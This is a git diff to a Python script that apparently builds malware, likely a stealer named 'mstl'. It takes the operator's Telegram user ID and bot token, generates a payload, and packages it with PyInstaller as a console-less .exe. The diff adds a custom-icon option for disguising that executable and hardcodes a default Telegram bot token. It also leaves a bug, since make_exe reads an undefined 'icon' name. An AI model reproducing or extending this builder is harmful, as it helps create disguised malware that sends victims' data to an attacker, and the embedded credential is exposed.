@@ -79,15 +79,16 @@ def make_python(ID, TOKEN, NAME):
     with open(f"output/{NAME}.py", "w") as write:
         write.write(text)
     print(Fore.GREEN + "File is created in /output directory.")
-def make_exe(NAME): 
+def make_exe(NAME, ICON): 
     system("mkdir output/exe")
-    system(f"pyinstaller --name {NAME} --onefile -i Files/icon.ico --noconsole --distpath output/exe output/mstl.py")
+    system(f"pyinstaller --name {NAME} --onefile -i {icon} --noconsole --distpath output/exe output/mstl.py")
     print(Fore.GREEN + ".exe application is created in /output/exe/mstl")
 banner()
 try: 
     id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
     tok = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome token write C if not press enter: ")).lower()
     name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome name write C if not press enter: ")).lower()
+    icon = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome icon write C if not press enter: ")).lower()    
     if name == "c": 
         name = input("Write your app name(ex: mstl): ")
     else: 
@@ -96,10 +97,14 @@ try:
         token = input("Write your bot token: ")
     else: 
         token = "6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is"
+    if icon == "c":
+        icon = input("write your icon file address(.ico file): ")
+        if icon.endswith(".ico"): pass
+        else: icon = "Files/icon.ico"
     make_python(ID=id, TOKEN=token, NAME=name)
     opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
     if opt == "y": 
-        make_exe(NAME=name)
+        make_exe(NAME=name, ICON=icon)
     else: 
         exit(Fore.CYAN + "\n\n Good Luck \n\n" + Fore.RESET)
 except ValueError: print(Fore.RED + "You must write str."), exit()
